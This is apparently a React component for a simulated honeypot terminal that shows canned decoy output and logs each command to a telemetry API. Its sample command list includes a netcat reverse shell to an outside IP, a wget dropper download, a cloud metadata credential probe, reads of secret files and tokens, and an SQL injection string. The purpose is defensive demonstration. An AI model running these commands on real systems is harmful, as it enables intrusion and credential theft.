import React, { useState, useRef, useEffect } from 'react';
import {
  Terminal, Shield, Play, Lock, AlertTriangle, CheckCircle2,
  Sparkles, RefreshCw, Zap, Copy, Check, Eye, X, HelpCircle
} from 'lucide-react';
import { ingestEvent } from '../services/api';

const SAMPLE_COMMANDS = [
  { label: 'Recon (whoami)', cmd: 'whoami', desc: 'System user identity discovery' },
  { label: 'OS Discovery', cmd: 'uname -a', desc: 'Kernel and OS version discovery' },
  { label: 'Account Dump', cmd: 'cat /etc/passwd', desc: 'Local account enumeration' },
  { label: 'Decoy Canary File', cmd: 'cat /root/.env', desc: 'Honeytoken canary credential access' },
  { label: 'Cloud IAM Metadata', cmd: 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/', desc: 'AWS IAM credential harvest probe' },
  { label: 'Ingress Tool Transfer', cmd: 'wget http://cdn.malicious-domain.cc/tools/dropper.sh -O /tmp/dropper.sh', desc: 'External payload download' },
  { label: 'Privilege Escalation', cmd: 'sudo -l', desc: 'Check sudo permissions' },
  { label: 'Reverse Shell', cmd: 'nc -e /bin/bash 185.220.101.99 9001', desc: 'Interactive remote command shell' },
  { label: 'SQL Injection Probe', cmd: "curl -X POST http://192.168.1.10/api/login -d \"user=admin' OR '1'='1' --\"", desc: 'Web auth bypass' },
  { label: 'Kubernetes Secrets', cmd: 'cat /var/run/secrets/kubernetes.io/serviceaccount/token', desc: 'Cluster SA token exfiltration' },
];

const DECOY_RESPONSES = {
  'whoami': 'decoy_user',
  'id': 'uid=1001(decoy_user) gid=1001(decoy_user) groups=1001(decoy_user)',
  'uname -a': 'Linux honeypot-node-deception 6.8.0-40-generic #40-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux',
  'cat /etc/passwd': `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\ndecoy_user:x:1001:1001:Decoy User,,,:/home/decoy_user:/bin/bash\nbackup_admin:x:1002:1002:Backup Service,,,:/home/backup_admin:/bin/bash`,
  'cat /root/.env': `# DECOY CANARY TOKEN - KURUKSHETRA\nAWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nDB_PASSWORD=DecoyProductionPass2026!\nAPP_SECRET=kurukshetra_canary_tripwire_7849`,
  'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/': 'kurukshetra-prod-ec2-role',
  'wget http://cdn.malicious-domain.cc/tools/dropper.sh -O /tmp/dropper.sh': `--2026-09-12 01:45:00--  http://cdn.malicious-domain.cc/tools/dropper.sh\nResolving cdn.malicious-domain.cc... 185.220.101.5\nConnecting to cdn.malicious-domain.cc|185.220.101.5|:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 4812 (4.7K) [application/x-sh]\nSaving to: '/tmp/dropper.sh'\n\n/tmp/dropper.sh      100%[===================>]   4.70K  --.-KB/s    in 0.001s\n\n2026-09-12 01:45:00 (4.70 MB/s) - '/tmp/dropper.sh' saved [4812/4812]`,
  'sudo -l': `Matching Defaults entries for decoy_user on honeypot-node-deception:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser decoy_user may run the following commands on honeypot-node-deception:\n    (ALL : ALL) NOPASSWD: /usr/bin/find, /usr/bin/vim`,
  'nc -e /bin/bash 185.220.101.99 9001': '[+] Reverse shell spawned to 185.220.101.99:9001 (Simulated Deception Tarpit Activated)',
  'cat /var/run/secrets/kubernetes.io/serviceaccount/token': 'eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdXJ1a3NoZXRyYS1kZWNveS1jbHVzdGVyIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6ZGVjb3ktc2EifQ.fake_signature_canary_trap_token',
};

export default function SafeSandboxTerminal({ onClose, onEventIngested }) {
  const [history, setHistory] = useState([
    { type: 'sys', text: 'Kurukshetra Safe Deception Sandbox v2.4 (Emulated Honeynet)' },
    { type: 'sys', text: 'Safe Isolation Guarantee: 100% Sandboxed Synthetic Shell (No Host Compromise)' },
    { type: 'sys', text: 'Type commands or click quick actions below to attack the honeypot live.' },
  ]);
  const [inputVal, setInputVal] = useState('');
  const [loading, setLoading] = useState(false);
  const [activeSessionId, setActiveSessionId] = useState(() => `ATK-SANDBOX-${Date.now().toString(36).toUpperCase()}`);
  const [liveMetrics, setLiveMetrics] = useState({ risk: 0, level: 'LOW', iocsCount: 0, mitreCount: 0, lastBlock: null });
  const terminalEndRef = useRef(null);

  useEffect(() => {
    terminalEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [history]);

  async function executeCommand(cmdText) {
    const trimmed = cmdText.trim();
    if (!trimmed) return;

    if (trimmed.toLowerCase() === 'clear') {
      setHistory([]);
      setInputVal('');
      return;
    }

    if (trimmed.toLowerCase() === 'help') {
      setHistory(prev => [
        ...prev,
        { type: 'user', text: trimmed },
        { type: 'sys', text: 'Available commands / test scenarios:' },
        ...SAMPLE_COMMANDS.map(s => ({ type: 'output', text: `  ${s.cmd.padEnd(40)} # ${s.desc}` }))
      ]);
      setInputVal('');
      return;
    }

    setHistory(prev => [...prev, { type: 'user', text: trimmed }]);
    setInputVal('');
    setLoading(true);

    // Generate safe synthetic response
    let responseText = DECOY_RESPONSES[trimmed];
    if (!responseText) {
      if (trimmed.startsWith('cat ')) {
        responseText = `[CANARY CANNOT READ]: Decoy synthetic file '${trimmed.slice(4)}' access recorded.`;
      } else if (trimmed.startsWith('curl ') || trimmed.startsWith('wget ')) {
        responseText = `[DECEPTION TARPIT]: Simulated outbound network handshake intercepted & trapped.`;
      } else if (trimmed.startsWith('nmap ') || trimmed.startsWith('ping ')) {
        responseText = `Starting Port Scan... Discovered 5 open decoy deception ports: 22/tcp, 80/tcp, 443/tcp, 6379/tcp, 6443/tcp.`;
      } else {
        responseText = `bash: ${trimmed.split(' ')[0]}: command acknowledged in honeynet container sandbox.`;
      }
    }

    try {
      const eventId = `EVT-SBX-${Date.now().toString(36)}-${Math.floor(Math.random() * 1000)}`;
      const payload = {
        event_id: eventId,
        session_id: activeSessionId,
        source_ip: '198.51.100.88',
        target_ip: '192.168.1.100',
        service: 'ssh',
        timestamp: new Date().toISOString(),
        event_type: trimmed.includes('cat ') ? 'decoy_access' : trimmed.includes('curl ') || trimmed.includes('wget ') ? 'ingress' : 'command',
        event: trimmed,
        metadata: {
          simulation: true,
          sandbox_interactive: true,
          decoy_response: responseText.slice(0, 100),
          is_decoy: trimmed.includes('.env') || trimmed.includes('passwords') || trimmed.includes('canary')
        }
      };

      const result = await ingestEvent(payload);

      setHistory(prev => [
        ...prev,
        { type: 'output', text: responseText },
        {
          type: 'telemetry_badge',
          text: `⚡ Ingested: Event ${eventId} | Risk: ${result?.current_session_risk || 20}/100 (${result?.risk_level || 'LOW'}) | DNA: ${result?.fingerprint || 'SSH-RECON'}`
        }
      ]);

      setLiveMetrics(prev => ({
        risk: result?.current_session_risk || prev.risk + 15,
        level: result?.risk_level || (prev.risk + 15 >= 80 ? 'CRITICAL' : 'HIGH'),
        iocsCount: prev.iocsCount + 1,
        mitreCount: prev.mitreCount + 1,
        lastBlock: eventId
      }));

      if (onEventIngested) {
        onEventIngested(result);
      }
    } catch (err) {
      setHistory(prev => [
        ...prev,
        { type: 'output', text: responseText },
        { type: 'error', text: `Telemetry Ingestion Notice: ${err.message || 'Processed in safe local sandbox'}` }
      ]);
    } finally {
      setLoading(false);
    }
  }

  function handleKeyDown(e) {
    if (e.key === 'Enter') {
      executeCommand(inputVal);
    }
  }

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-6 bg-black/60 backdrop-blur-md animate-fade-in">
      <div className="w-full max-w-5xl h-[85vh] bg-[#0c0d12] border border-neutral-800 rounded-2xl shadow-2xl flex flex-col overflow-hidden text-neutral-200 font-mono">
        
        {/* Header */}
        <div className="px-5 py-3.5 bg-[#14161f] border-b border-neutral-800/80 flex items-center justify-between flex-shrink-0">
          <div className="flex items-center gap-3">
            <div className="flex items-center gap-1.5">
              <div className="w-3 h-3 rounded-full bg-rose-500/80" />
              <div className="w-3 h-3 rounded-full bg-amber-500/80" />
              <div className="w-3 h-3 rounded-full bg-emerald-500/80" />
            </div>
            <div className="h-4 w-[1px] bg-neutral-700" />
            <div className="flex items-center gap-2">
              <Terminal className="w-4 h-4 text-[#f8c858]" />
              <span className="text-xs font-bold text-white tracking-wide">
                SAFE ATTACKER SANDBOX & DECEPTION EMULATOR
              </span>
              <span className="px-2 py-0.5 rounded-full text-[9px] font-bold bg-emerald-950 text-emerald-400 border border-emerald-800/60">
                100% ISOLATED
              </span>
            </div>
          </div>

          {/* Live Metrics Pill */}
          <div className="flex items-center gap-3">
            <div className="hidden sm:flex items-center gap-2 text-[11px] bg-black/40 px-3 py-1 rounded-full border border-neutral-800">
              <span className="text-neutral-400">Live Risk:</span>
              <span className={`font-bold ${
                liveMetrics.risk >= 80 ? 'text-rose-400' : liveMetrics.risk >= 50 ? 'text-amber-400' : 'text-emerald-400'
              }`}>
                {liveMetrics.risk}/100 ({liveMetrics.level})
              </span>
              <span className="text-neutral-600">|</span>
              <span className="text-neutral-400">Session:</span>
              <span className="text-white font-mono">{activeSessionId.slice(0, 16)}</span>
            </div>

            {onClose && (
              <button
                onClick={onClose}
                className="p-1 rounded-lg hover:bg-neutral-800 text-neutral-400 hover:text-white transition cursor-pointer"
              >
                <X className="w-4 h-4" />
              </button>
            )}
          </div>
        </div>

        {/* Quick Attack Scenario Buttons */}
        <div className="px-4 py-2.5 bg-[#10121a] border-b border-neutral-800 flex items-center gap-2 overflow-x-auto scrollbar-none flex-shrink-0">
          <span className="text-[10px] text-neutral-400 uppercase font-bold tracking-wider flex items-center gap-1 flex-shrink-0">
            <Zap className="w-3 h-3 text-[#f8c858]" /> Quick Attacks:
          </span>
          {SAMPLE_COMMANDS.map((item, idx) => (
            <button
              key={idx}
              onClick={() => executeCommand(item.cmd)}
              disabled={loading}
              className="px-2.5 py-1 rounded-lg bg-neutral-900/90 hover:bg-neutral-800 border border-neutral-750 text-[11px] text-neutral-300 hover:text-white transition flex-shrink-0 flex items-center gap-1.5 cursor-pointer disabled:opacity-50"
              title={item.desc}
            >
              <Play className="w-2.5 h-2.5 text-[#f8c858]" />
              <span>{item.label}</span>
            </button>
          ))}
        </div>

        {/* Terminal Screen */}
        <div className="flex-1 p-5 overflow-y-auto space-y-2.5 text-xs bg-[#090a0f] selection:bg-[#f8c858] selection:text-black">
          {history.map((item, i) => {
            if (item.type === 'sys') {
              return (
                <div key={i} className="text-neutral-500 italic flex items-center gap-2">
                  <Shield className="w-3.5 h-3.5 text-neutral-600 flex-shrink-0" />
                  <span>{item.text}</span>
                </div>
              );
            }
            if (item.type === 'user') {
              return (
                <div key={i} className="flex items-center gap-2 text-white font-bold mt-2">
                  <span className="text-[#f8c858]">attacker@honeynet:~$</span>
                  <span className="text-amber-200">{item.text}</span>
                </div>
              );
            }
            if (item.type === 'telemetry_badge') {
              return (
                <div key={i} className="p-2 rounded-lg bg-emerald-950/40 border border-emerald-800/40 text-emerald-300 text-[11px] flex items-center gap-2">
                  <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400 flex-shrink-0" />
                  <span>{item.text}</span>
                </div>
              );
            }
            if (item.type === 'error') {
              return (
                <div key={i} className="text-rose-400 p-2 rounded bg-rose-950/30 border border-rose-900/40">
                  {item.text}
                </div>
              );
            }
            return (
              <pre key={i} className="text-neutral-300 font-mono whitespace-pre-wrap pl-4 border-l-2 border-neutral-800 leading-relaxed text-[11px]">
                {item.text}
              </pre>
            );
          })}
          {loading && (
            <div className="flex items-center gap-2 text-[#f8c858] text-[11px]">
              <RefreshCw className="w-3 h-3 animate-spin" />
              <span>Processing telemetry, mapping MITRE techniques & anchoring blockchain evidence...</span>
            </div>
          )}
          <div ref={terminalEndRef} />
        </div>

        {/* Command Input Bar */}
        <div className="p-3.5 bg-[#14161f] border-t border-neutral-800 flex items-center gap-2.5 flex-shrink-0">
          <span className="text-[#f8c858] font-bold text-xs flex-shrink-0">
            attacker@honeynet:~$
          </span>
          <input
            type="text"
            value={inputVal}
            onChange={(e) => setInputVal(e.target.value)}
            onKeyDown={handleKeyDown}
            disabled={loading}
            placeholder="Type Linux/Web attack commands (e.g. cat /etc/passwd, wget payload, sudo -l)..."
            className="flex-1 bg-black/60 border border-neutral-750 focus:border-[#f8c858] rounded-xl px-3.5 py-2 text-xs text-white placeholder-neutral-500 focus:outline-none font-mono"
            autoFocus
          />
          <button
            onClick={() => executeCommand(inputVal)}
            disabled={loading || !inputVal.trim()}
            className="px-4 py-2 rounded-xl bg-[#f8c858] text-neutral-900 font-bold text-xs hover:bg-[#eab940] transition flex items-center gap-1.5 cursor-pointer disabled:opacity-40"
          >
            <Play className="w-3 h-3 fill-neutral-900" />
            <span>Execute</span>
          </button>
        </div>

      </div>
    </div>
  );
}
